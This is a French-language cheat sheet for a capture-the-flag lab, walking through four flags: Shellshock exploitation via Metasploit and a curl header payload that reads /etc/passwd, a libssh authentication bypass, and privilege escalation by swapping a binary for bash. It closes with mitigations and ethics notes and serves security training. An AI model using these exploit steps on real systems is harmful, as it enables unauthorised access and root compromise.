# System-Host Based Attacks CTF 2 - Cheat Sheet

## Vue d'ensemble du CTF
Ce CTF couvre **4 flags** répartis sur **2 cibles** avec des vulnérabilités différentes :
- **target1.ine.local** (Flags 1 & 2) - Exploitation Shellshock
- **target2.ine.local** (Flags 3 & 4) - Bypass libssh + Escalade de privilèges

---

## 🎯 FLAG 1: Exploitation Shellshock

### **Question:** *"Check the root ('/') directory for a file that might hold the key to the first flag on target1.ine.local."*

#### **Étapes d'exploitation:**

1. **Reconnaissance initiale**
   ```bash
   nmap -sC -sV -p- target1.ine.local
   ```
   - Port 80 ouvert avec serveur web
   - Site "Modern Art Gallery" utilisant CGI

2. **Test vulnérabilité Shellshock**
   ```bash
   # Dans Metasploit
   use scanner/http/apache_mod_cgi_bash_env
   set RHOSTS target1.ine.local
   set TARGETURI /browser.cgi
   run
   ```
   - Confirme la vulnérabilité Shellshock

3. **Exploitation Shellshock**
   ```bash
   # Dans Metasploit
   use multi/http/apache_mod_cgi_bash_env_exec
   set LHOST [votre_ip]
   set RHOSTS target1.ine.local
   set TARGETURI /browser.cgi
   exploit
   ```

4. **Obtention du shell**
   ```bash
   shell
   /bin/bash -i
   ```

5. **Récupération du flag**
   ```bash
   cd /
   cat flag1.txt
   ```

---

## 🎯 FLAG 2: Exploration répertoires cachés

### **Question:** *"In the server's root directory, there might be something hidden. Explore '/opt/apache/htdocs/' carefully to find the next flag."*

#### **Démarche:**
```bash
# Utiliser la session shell existante
cd /opt/apache/htdocs/
ls -la
cat flag2.txt
```

---

## 🎯 FLAG 3: Bypass d'authentification libssh

### **Question:** *"Investigate the user's home directory and consider using 'libssh_auth_bypass' to uncover the flag on target2.ine.local."*

#### **Étapes d'exploitation:**

1. **Reconnaissance target2**
   ```bash
   nmap -sC -sV -p- target2.ine.local
   ```
   - Port SSH ouvert

2. **Exploitation libssh bypass**
   ```bash
   # Dans Metasploit
   use scanner/ssh/libssh_auth_bypass
   set SPAWN_PTY true
   set RHOSTS target2.ine.local
   run
   ```

3. **Accès à la session**
   ```bash
   sessions -l
   sessions -i [numéro_session]
   ```

4. **Récupération du flag**
   ```bash
   cd ~
   cat flag3.txt
   ```

---

## 🎯 FLAG 4: Escalade de privilèges

### **Question:** *"The most restricted areas often hold the most valuable secrets. Look into the '/root' directory to find the hidden flag."*

#### **Démarche d'escalade:**

1. **Tentative d'accès root (échec)**
   ```bash
   cd /root
   # Access denied
   ```

2. **Analyse des fichiers locaux**
   ```bash
   ls -la
   file greetings
   file welcome
   ```
   - `greetings` et `welcome` sont des binaires
   - Permissions lecture seule sur `welcome`

3. **Analyse du binaire welcome**
   ```bash
   strings welcome
   ```
   - Révèle que le binaire exécute `greetings`

4. **Exploitation Path Hijacking**
   ```bash
   # Supprimer le fichier greetings original
   rm greetings
   
   # Créer un nouveau greetings avec bash
   cp /bin/bash greetings
   
   # Exécuter welcome pour obtenir root shell
   ./welcome
   ```

5. **Récupération du flag root**
   ```bash
   cd /root
   ls -al
   cat flag4.txt
   ```

---

## 📋 Vulnérabilités Exploitées

### **Shellshock (CVE-2014-6271)**
- **Description:** Exécution de code via variables d'environnement Bash
- **Cible:** Scripts CGI utilisant Bash
- **Impact:** RCE (Remote Code Execution)

### **Libssh Authentication Bypass (CVE-2018-10933)**
- **Description:** Bypass d'authentification dans libssh
- **Cible:** Serveurs SSH utilisant libssh vulnérable
- **Impact:** Accès non autorisé

### **Path Hijacking**
- **Description:** Exploitation de binaires exécutant des programmes relatifs
- **Cible:** Programmes SUID/privilégiés avec PATH non sécurisé
- **Impact:** Escalade de privilèges

---

## 🔧 Outils et Techniques

### **Reconnaissance**
```bash
# Scan complet
nmap -sC -sV -p- target

# Identification de services
nmap --script=banner target
```

### **Exploitation Shellshock**
```bash
# Test manuel
curl -H "User-Agent: () { :; }; echo; echo; /bin/cat /etc/passwd" \
     http://target/cgi-bin/script.cgi

# Via Metasploit
use multi/http/apache_mod_cgi_bash_env_exec
```

### **Analyse de binaires**
```bash
# Informations sur le fichier
file binary_name

# Strings lisibles
strings binary_name

# Permissions et propriétés
ls -la binary_name

# Trace d'exécution
strace ./binary_name
```

---

## 🛡️ Mesures de Sécurisation

### **Protection contre Shellshock**
- Mettre à jour Bash vers une version patché
- Désactiver CGI si non nécessaire
- Utiliser des alternatives à Bash pour les scripts CGI
- Filtrer les variables d'environnement malveillantes

### **Sécurisation SSH**
- Mettre à jour libssh vers une version non vulnérable
- Utiliser l'authentification par clés uniquement
- Implémenter fail2ban pour les tentatives de brute-force
- Surveiller les connexions SSH suspectes

### **Prévention Path Hijacking**
- Utiliser des chemins absolus dans les binaires
- Définir un PATH sécurisé au début des scripts
- Éviter l'exécution de programmes externes depuis des binaires privilégiés
- Appliquer le principe du moindre privilège

---

## 💡 Points Clés d'Apprentissage

### **Reconnaissance Web**
- Identifier les technologies utilisées (CGI, frameworks)
- Rechercher des vulnérabilités connues associées
- Tester les scripts CGI pour Shellshock

### **Exploitation SSH**
- Utiliser des modules Metasploit spécialisés
- Configurer correctement SPAWN_PTY pour les sessions
- Gérer les sessions multiples avec `sessions -i`

### **Escalade de privilèges**
- Analyser les binaires SUID/SGID
- Utiliser `strings` pour comprendre le comportement
- Exploiter les vulnérabilités PATH dans les programmes

### **Méthodologie Progressive**
1. **Reconnaissance** → Identification des services
2. **Identification des vulnérabilités** → Tests spécifiques
3. **Exploitation initiale** → Obtention d'un foothold
4. **Escalade** → Élévation de privilèges
5. **Objectifs** → Récupération des flags/données

---

## ⚠️ Considérations Éthiques

### **Usage Responsable**
- Utiliser uniquement sur des systèmes autorisés
- Documenter toutes les vulnérabilités découvertes
- Proposer des correctifs appropriés
- Respecter la confidentialité des données

### **Environnements de Test**
- Labs CTF et environnements dédiés
- Machines virtuelles isolées
- Plateformes légales (HackTheBox, TryHackMe)
- Programmes de bug bounty autorisés

Ce CTF illustre l'importance de maintenir les systèmes à jour et de suivre les bonnes pratiques de sécurité pour éviter l'exploitation de vulnérabilités connues.